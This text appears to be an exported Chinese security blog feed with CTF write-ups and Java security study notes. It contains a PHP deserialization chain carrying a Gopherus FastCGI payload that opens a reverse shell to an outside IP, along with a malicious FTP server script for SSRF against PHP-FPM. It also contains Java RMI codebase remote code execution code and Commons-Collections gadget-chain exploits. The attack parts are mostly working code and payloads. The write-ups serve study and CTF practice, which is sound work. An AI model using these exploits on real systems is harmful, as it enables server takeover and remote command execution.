$this-&gt;data);。但是在Bypass::__destruct里有一个条件Check::$str1，这个$str1默认为false，要想变为true，需要反序列化Esle类，但又没有其他属性可以控制，这道题我到这直接嗝屁，后来问了几位师傅，说是可以自己构造属性来调用Else，我纳闷还有这种操作，我以为反序列化只能控制已经定义的属性，这次真的又学到了。 直接贴payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phpclass Check &#123; public static $str1 = false; public static $str2 = false;&#125;class Esle &#123; // __wakeup()，执行unserialize()时，先会调用这个函数 public function __wakeup() &#123; Check::$str1 = true; &#125;&#125;class Bunny &#123; public function __toString() &#123; echo "__toString"; if (Check::$str2) &#123; if(!$this-&gt;data)&#123; $this-&gt;data = $_REQUEST['data']; &#125; // 利用点 // Bypass::__destruct-&gt;Welcome::__invoke-&gt;Bunny::__toString file_put_contents($this-&gt;filename, $this-&gt;data); &#125; else &#123; throw new Error("Error"); &#125; &#125;&#125;class Welcome &#123; // __invoke()，调用函数的方式调用一个对象时的回应方法 public function __invoke() &#123; echo "__invoke"; Check::$str2 = true; return "Welcome" . $this-&gt;username; &#125;&#125;class Bypass &#123; public function __construct() &#123; // 自己构造 $this-&gt;esle = new Esle(); &#125; public function __destruct() &#123; echo "__destruct"; if (Check::$str1) &#123; // $this-&gt;str4 Welcome ($this-&gt;str4)(); &#125; else &#123; throw new Error("Error"); &#125; &#125;&#125;$b1 = new Bunny();$b1-&gt;data = "123";$b1-&gt;filename = "1.txt";$we = new Welcome();$we-&gt;username = $b1;$by = new Bypass();$by-&gt;str4 = $we;echo serialize($by); 1O:6:&quot;Bypass&quot;:2:&#123;s:4:&quot;esle&quot;;O:4:&quot;Esle&quot;:0:&#123;&#125;s:4:&quot;str4&quot;;O:7:&quot;Welcome&quot;:1:&#123;s:8:&quot;username&quot;;O:5:&quot;Bunny&quot;:2:&#123;s:4:&quot;data&quot;;s:3:&quot;123&quot;;s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;&#125;&#125;&#125; 在本地搭建环境进行测试 可以正常写入 但是放在比赛环境里就不能写入，猜测应该是没有写入权限。 看了wp，利用了file_put_contents($this-&gt;filename, $this-&gt;data)这里，直接通过SSRF 攻击 FPM/FastCGI。 攻击步骤首先通过gopherus脚本生成payload 12345678910111213141516171819202122f:\Tools\WEB\Python-Tools\Gopherus-master&gt; python gopherus.py --exploit fastcgi ________ .__ / _____/ ____ ______ | |__ ___________ __ __ ______/ \ ___ / _ \\____ \| | \_/ __ \_ __ \ | \/ ___/\ \_\ ( &lt;_&gt; ) |_&gt; &gt; Y \ ___/| | \/ | /\___ \ \______ /\____/| __/|___| /\___ &gt;__| |____//____ &gt; \/ |__| \/ \/ \/ author: $_SpyD3r_$Give one file name which should be surely present in the server (prefer .php file)if you don't know press ENTER we have default one: /var/www/html/index.phpTerminal command to run: bash -c "bash -i &gt;&amp; /dev/tcp/vpsip/4444 0&gt;&amp;1"Your gopher link is ready to do SSRF:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/vpsip/4444%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00-----------Made-by-SpyD3r----------- 用下面这段 1%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/vpsip/4444%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 接下来将这段payload带入序列化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phpclass Check &#123; public static $str1 = false; public static $str2 = false;&#125;class Esle &#123; // __wakeup()，执行unserialize()时，先会调用这个函数 public function __wakeup() &#123; Check::$str1 = true; &#125;&#125;class Bunny &#123; public function __toString() &#123; echo "__toString"; if (Check::$str2) &#123; if(!$this-&gt;data)&#123; $this-&gt;data = $_REQUEST['data']; &#125; // 利用点 // Bypass::__destruct-&gt;Welcome::__invoke-&gt;Bunny::__toString file_put_contents($this-&gt;filename, $this-&gt;data); &#125; else &#123; throw new Error("Error"); &#125; &#125;&#125;class Welcome &#123; // __invoke()，调用函数的方式调用一个对象时的回应方法 public function __invoke() &#123; echo "__invoke"; Check::$str2 = true; return "Welcome" . $this-&gt;username; &#125;&#125;class Bypass &#123; public function __construct() &#123; // 自己构造 $this-&gt;esle = new Esle(); &#125; public function __destruct() &#123; echo "__destruct"; if (Check::$str1) &#123; // $this-&gt;str4 Welcome ($this-&gt;str4)(); &#125; else &#123; throw new Error("Error"); &#125; &#125;&#125;$b1 = new Bunny();$b1-&gt;data = urldecode("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/121.4.65.44/4444%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00");$b1-&gt;filename = "ftp://aaa@121.4.65.44:23/123";$we = new Welcome();$we-&gt;username = $b1;$by = new Bypass();$by-&gt;str4 = $we;echo urlencode(serialize($by)); 得到 1O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A4%3A%22esle%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A2%3A%7Bs%3A4%3A%22data%22%3Bs%3A413%3A%22%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo+%2F+fcgiclient+%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include+%3D+On%0Adisable_functions+%3D+%0Aauto_prepend_file+%3D+php%3A%2F%2Finput%0F%17SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%0D%01DOCUMENT_ROOT%2F%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp+system%28%27bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F121.4.65.44%2F4444+0%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00%22%3Bs%3A8%3A%22filename%22%3Bs%3A28%3A%22ftp%3A%2F%2Faaa%40121.4.65.44%3A23%2F123%22%3B%7D%7D%7D 接下来在vps上运行恶意ftp服务器 脚本如下 123456789101112131415161718192021222324252627import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23))s.listen(1)conn, addr = s.accept()conn.send(b'220 welcome\n')#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b'331 Please specify the password.\n')#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b'230 Login successful.\n')#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b'200 Switching to Binary mode.\n')#Size /conn.send(b'550 Could not get the file size.\n')#EPSV (1)conn.send(b'150 ok\n')#PASVconn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)conn.send(b'150 Permission denied.\n')#QUITconn.send(b'221 Goodbye.\n')conn.close() 再用nc监听4444端口 最后，只需要提交反序列化得到的payload EasyJaba目前未找到wp]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [GXYCTF2019]StrongestMind 1]]></title>
    <url>%2F2021%2F11%2F07%2F%5BGXYCTF2019%5DStrongestMind%201%2F</url>
    <content type="text"><![CDATA[考点python脚本编写 解题过程打开 解题脚本 123456789101112131415import requestsimport reurl = "http://89e87348-52e7-4e85-89b4-a42b94b8d0ac.node4.buuoj.cn:81/index.php"req = requests.session()res = req.get(url)# print(res.text)for i in range(1010): import time time.sleep(0.1) res2 = re.findall(r'¦&lt;br&gt;&lt;br&gt;(.+?)&lt;br&gt;', res.text)[0] res = req.post(url, data=&#123;"answer": eval(res2)&#125;) print(res.text)]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>python脚本编写</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java安全学习笔记（一）]]></title>
    <url>%2F2021%2F11%2F02%2FJava%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[反射 Java中对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。（P神的定义） 反射中几位重要的方法 获取类的方法：forname 实例化类对象的方法：newInstance 获取函数的方法：getMethod 执行函数的方法：invoke 获取类的三种方式 obj.getClass() 如果上下文中存在某个类的实例obj，那么我们可以直接通过obj.getClass()来获取它的类。 123Runtime runtime = Runtime.getRuntime(); System.out.println(runtime.getClass());// class java.lang.Runtime Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接 拿它的 class 属性即可。这个⽅法其实不属于反射。 Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取 123Class clazz = Class.forName("java.lang.Runtime"); System.out.println(clazz);// class java.lang.Runtime 使用newInstance不成功的一些原因 你使用的类没有无参构造函数 你使用的类构造函数是私有的 案例 12Class clazz = Class.forName("java.lang.Runtime");clazz.getMethod("exec", String.class).invoke(clazz.newInstance(), "whoami"); 会报错 原因是Runtime类的构造方法是私有的 可以这样 12Class clazz = Class.forName("java.lang.Runtime");clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "calc.exe"); getMethod的作用是通过反射获取一个类的特定的公有方法。 invoke的作用是执行方法，它的第一个参数是： 如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 上述命令执行的payload可以分解为 12345Class clazz = Class.forName("java.lang.Runtime");Method exec = clazz.getMethod("exec", String.class);Method getRuntimeMethod = clazz.getMethod("getRuntime");Object runtime = getRuntimeMethod.invoke(clazz);exec.invoke(runtime, "calc.exe"); 到这里P神提出了两个疑问 如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ 如果一个方法或构造方法是私有方法，我们是否能执行它呢？ 第一个问题的解决方式，需要用到一个新的放射方法getConstructor 和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。 获取到构造函数后，我们使用 newInstance 来执行。 ProcessBuilder有两个构造函数 public ProcessBuilder(List command) public ProcessBuilder(String… command) 用第一种形式 主要传入List.class 12Class clazz = Class.forName("java.lang.ProcessBuilder"); ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start(); 利用反射的方式 12Class clazz = Class.forName("java.lang.ProcessBuilder"); clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))); 第二种形式 主要传入String[].class 12Class clazz = Class.forName("java.lang.ProcessBuilder"); ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;"calc.exe"&#125;&#125;)).start(); 反射的方式 12Class clazz = Class.forName("java.lang.ProcessBuilder");clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;"calc.exe"&#125;&#125;)); 第二个问题：如果一个方法或构造方法是私有方法，我们是否能执行它呢？ 解决方式是getDeclared系列的反射，它与普通的getMethod、getConstructor区别是： getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了 实现代码 1234Class clazz = Class.forName("java.lang.Runtime"); Constructor exec = clazz.getDeclaredConstructor(); exec.setAccessible(true); clazz.getMethod("exec", String.class).invoke(exec.newInstance(), "calc.exe"); 这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。 RMI RMI全称是Remote Method Invocation，远程方法调用。 RMI Server 123456789101112131415161718192021222324252627282930313233343536373839404142package org.vulhub.RMI;import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.UnicastRemoteObject;public class RmiServer &#123; // interface继承自interface使用extends // interface 代表这个类没有字段 全是方法 // ⼀个继承了 java.rmi.Remote 的接⼝ 其中定义了我们要调用的类 public interface IRemoteHelloWorld extends Remote &#123; // 这一句是什么意思？ public String hello() throws RemoteException; &#125; // extends 继承关键字 // 使用 implements 关键字可以变相的使java具有多继承的特性 // throw和throws就是异常相关的关键字 public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123; protected RemoteHelloWorld() throws RemoteException &#123; super(); &#125; // 定义我们要远程调⽤的函数 public String hello() throws RemoteException &#123; System.out.println("call from"); return "Hello world"; &#125; &#125; // ⼀个主类，⽤来创建Registry private void start() throws Exception &#123; RemoteHelloWorld h = new RemoteHelloWorld(); LocateRegistry.createRegistry(1099); Naming.rebind("rmi://127.0.0.1:1099/Hello", h); &#125; public static void main(String[] args) throws Exception &#123; new RmiServer().start(); &#125;&#125; 一个RMI Server分为三部分 一个继承了java.rmi.Remote的接口，其中定义我们要远程调用的函数，比如这里的hello() 一个实现了此接口的类 一个主类，用来创建Register，并将上面的类实例化后绑定到一个地址，这就是我们所谓的Server了。 RMI Client 1234567891011121314package org.vulhub.Train;import org.vulhub.RMI.RMIServer;import java.rmi.Naming;import java.rmi.NotBoundException;import java.rmi.RemoteException;public class TrainMain &#123; public static void main(String[] args) throws Exception &#123; // 使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象 RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)Naming.lookup("rmi://172.20.10.1:1099/Hello"); String ret = hello.hello(); System.out.println( ret); &#125;&#125; 客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。 虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。 一个RMI过程有以下三个参与者： RMI Registey RMI Server RMI Client 如何攻击RMI Registry？ Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。 不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象： 12345// list方法可以列出目标上所有绑定的对象 String[] s = Naming.list("rmi://172.20.10.131:1099"); for (int i = 0; i &lt; s.length; i++) &#123; System.out.println(s[i]); &#125; 1234// lookup作用就是获得某个远程对象 RmiServer.IRemoteHelloWorld hello = (RmiServer.IRemoteHelloWorld)Naming.lookup("rmi://172.20.10.131:1099/Hello"); String ret = hello.hello(); System.out.println( ret); RMI利用codebase执行任意代码有满足如下条件的RMI服务器才能被攻击： 安装并配置了SecurityManager Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false 其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置： https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html 复现代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// ICalc.javaimport java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;public interface ICalc extends Remote &#123; public Integer sum(List&lt;Integer&gt; params) throws RemoteException;&#125;// Calc.javaimport java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;import java.rmi.server.UnicastRemoteObject;public class Calc extends UnicastRemoteObject implements ICalc &#123; public Calc() throws RemoteException &#123;&#125; public Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123; Integer sum = 0; for (Integer param : params) &#123; sum += param; &#125; return sum; &#125;&#125;// RemoteRMIServer.javaimport java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;import java.util.List;public class RemoteRMIServer &#123; private void start() throws Exception &#123; if (System.getSecurityManager() == null) &#123; System.out.println("setup SecurityManager"); System.setSecurityManager(new SecurityManager()); &#125; Calc h = new Calc(); LocateRegistry.createRegistry(1099); Naming.rebind("refObj", h); &#125; public static void main(String[] args) throws Exception &#123; new RemoteRMIServer().start(); &#125;&#125; // client.policygrant &#123; permission java.security.AllPermission;&#125;; 编译及运行 12javac *.javajava -Djava.rmi.server.hostname=172.20.10.131 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer 建立一个RMIClient.java： 12345678910111213141516171819202122import java.rmi.Naming;import java.util.List;import java.util.ArrayList;import java.io.Serializable;public class RMIClient implements Serializable &#123; public class Payload extends ArrayList&lt;Integer&gt; &#123; &#125; public void lookup() throws Exception &#123; ICalc r = (ICalc) Naming.lookup("rmi://172.20.10.131:1099/refObj"); List&lt;Integer&gt; li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); &#125; public static void main(String[] args) throws Exception &#123; new RMIClient().lookup(); &#125;&#125; 这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才 会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。 运行RMIClient： 1java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient 我们只需要编译一个恶意类，将其class文件放置在Web服务器的 /RMIClient$Payload.class 即可。 恶意类 123456789101112131415161718192021222324252627282930import java.rmi.Naming;import java.util.List;import java.util.ArrayList;import java.io.Serializable;public class RMIClient implements Serializable &#123; private static final long serialVersionUID = 1L; static &#123; try&#123; Runtime.getRuntime().exec("touch /tmp/Success"); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public class Payload extends ArrayList&lt;Integer&gt; &#123;&#125; public void lookup() throws Exception &#123; ICalc r = (ICalc) Naming.lookup("rmi://172.20.10.131:1099/refObj"); List&lt;Integer&gt; li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); &#125; public static void main(String[] args) throws Exception &#123; new RMIClient().lookup(); &#125;&#125; 想知道原理，可以通过抓包来查看RMI做了什么，跟着P神文章做了一遍，通过wireshark抓包，抓到一些进行了序列化的数据，用GitHub - NickstaDB/SerializationDumper: A tool to dump Java serialization streams in a more human readable form. 工具查看序列化数据，但是看不懂。 反序列化Java、php、Python反序列化有什么异同? Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式 生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。 但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者 在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。 当然，PHP中也提供了一个魔术方法叫 __wakeup ，在反序列化的时候进行触发。很多人会认为Java的 readObject 和PHP的 __wakeup 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决 的问题稍微有些差异。 Java设计 readObject 的思路和PHP的 __wakeup 不同点在于： readObject 倾向于解决“反序列化时如 何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的 问题。 PHP反序列化Java反序列化Python反序列化ysoserial工具https://github.com/frohoff/ysoserial 生成CommonsCollections利用poc 1java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot; URLDNSURLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： 使⽤Java内置的类构造，对第三⽅库没有依赖 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 common-collectionspoc1 1234567891011121314151617181920212223242526272829303132333435363738package org.vulhub.Ser;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class CommonCollections1 &#123; public static void main(String[] args) throws Exception &#123; // Transformer是⼀个接⼝，它只有⼀个待实现的⽅法 Transformer[] transformers = new Transformer[]&#123; // ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个 //对象，并在transform⽅法将这个对象再返回 // 所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作 new ConstantTransformer(Runtime.getRuntime()), // InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序 //列化能执⾏任意代码的关键。 // 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数 //是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表 new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;), &#125;; // ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串 //在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊， Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); // TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可 //以执⾏⼀个回调。 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // 触发执行Transformer回调 outerMap.put("test", "xxxx"); &#125;&#125; poc2 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package org.vulhub.Ser;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class CommonCollections2 &#123; public static void main(String[] args) throws Exception &#123; // 反序列化 不能序列化Runtime 因为没有实现 java.io.Serializeable// Method f = Runtime.class.getMethod("getRuntime");// Runtime r = (Runtime) f.invoke(null);// r.exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator"); // Transformer是⼀个接⼝，它只有⼀个待实现的⽅法 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;), new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new String[] &#123; "calc.exe" &#125;), &#125;; // ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串 //在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊， Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put("test", "xxxx"); innerMap.put("value", "xxxx"); // TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可 //以执⾏⼀个回调。 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // 触发执行Transformer回调 // outerMap.put("test", "xxxx"); Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Retention.class, outerMap); // 序列化 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); &#125;&#125; 小结看了URLDNS和common-collections这两条链子的利用和原理，利用倒是会了，原理确实是看不懂，也许是因为没有java相关的底子，我不知道是不是该继续看下去，因为确实挺费劲的，因为上次ctf题碰到java反序列化的题，做不起，所有才来学习java反序列化，但是java反序列化的坑很深，也并非一周两周就能够掌握，迷茫了。目前想法就是，找些环境来实践，先不管原理，先会利用起来，至少ctf中遇到能做得起。 Java RMI codebase 远程代码执行漏洞复现复现步骤https://vulhub.org/#/environments/java/rmi-codebase/ 使用Docker拉取漏洞环境 12345678910111213141516171819202122232425262728293031323334353637root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-codebase# docker-compose build/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release. from cryptography.hazmat.backends import default_backendBuilding rmiStep 1/9 : FROM openjdk:8u222-jdk ---&gt; fcb6c0ce31f9Step 2/9 : LABEL maintainer="phithon &lt;root@leavesongs.com&gt;" ---&gt; Using cache ---&gt; 68434cb7eb62Step 3/9 : ENV RMIIP="127.0.0.1" ---&gt; Using cache ---&gt; 57428be9e0eaStep 4/9 : COPY src/ /usr/src/ ---&gt; 0511fe1104fcStep 5/9 : WORKDIR /usr/src ---&gt; Running in 5bb6dbc8842cRemoving intermediate container 5bb6dbc8842c ---&gt; 81322e0babb4Step 6/9 : RUN set -ex &amp;&amp; javac *.java ---&gt; Running in 985d742f1604+ javac Calc.java ICalc.java RemoteRMIServer.javaRemoving intermediate container 985d742f1604 ---&gt; 679d43986c84Step 7/9 : EXPOSE 1099 ---&gt; Running in 1601dc557ad0Removing intermediate container 1601dc557ad0 ---&gt; e2d1bb14a7abStep 8/9 : EXPOSE 64000 ---&gt; Running in 62b7eb3c5affRemoving intermediate container 62b7eb3c5aff ---&gt; 9da81fd4e87cStep 9/9 : CMD ["bash", "-c", "java -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer"] ---&gt; Running in a66f149ea8b5Removing intermediate container a66f149ea8b5 ---&gt; d58e781c5c25Successfully built d58e781c5c25Successfully tagged rmi-codebase_rmi:latest 启动环境 1docker-compose run -e RMIIP=your-ip -p 1099:1099 -p 64000:64000 rmi 1234root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-codebase# docker-compose run -e RMIIP=xx.xx.xx.xx -p 1099:1099 -p 64000:64000 rmi/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release. from cryptography.hazmat.backends import default_backendsetup SecurityManager 因为是在云服务器上，执行反弹shell的话，无法反弹到本地主机，所以这里准备执行一条命令curl http://xx.xx.xx.xx:8000/exp 来验证命令是否被执行 首先构造一个恶意类 RMIClient.java 123456789101112131415161718192021222324252627282930313233import java.rmi.Naming;import java.util.List;import java.util.ArrayList;import java.io.Serializable;public class RMIClient implements Serializable &#123; private static final long serialVersionUID = 1L; static &#123; try&#123;// Runtime.getRuntime().exec(new 